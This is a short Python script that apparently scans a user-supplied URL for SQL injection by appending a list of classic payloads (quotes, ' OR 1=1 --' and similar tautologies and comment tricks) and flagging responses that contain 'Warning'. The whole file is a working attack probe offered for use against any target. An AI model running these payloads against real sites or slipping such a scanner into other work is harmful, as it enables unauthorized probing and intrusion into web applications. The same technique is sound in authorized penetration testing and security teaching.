import requests

def check_sqli(url, payload):
    
    new_url = url + payload

    response = requests.get(new_url)

    if "Warning" in response.text:
        print("[+] sqli vuln found: " + new_url)
    else:
        print("[-] not found any vuln: " + url + payload)


def main():
    url = input("target : ")

    payloads = ["'", "\"", " OR 1=1 --", " OR 1=1#", " OR 1=1/*", "AND 1=1 AND '%'='", "' or ''*'", "' or ''&'", "' --", "' and 1='1"]

    for payload in payloads:
        check_sqli(url, payload)

if __name__ == '__main__':
    main()
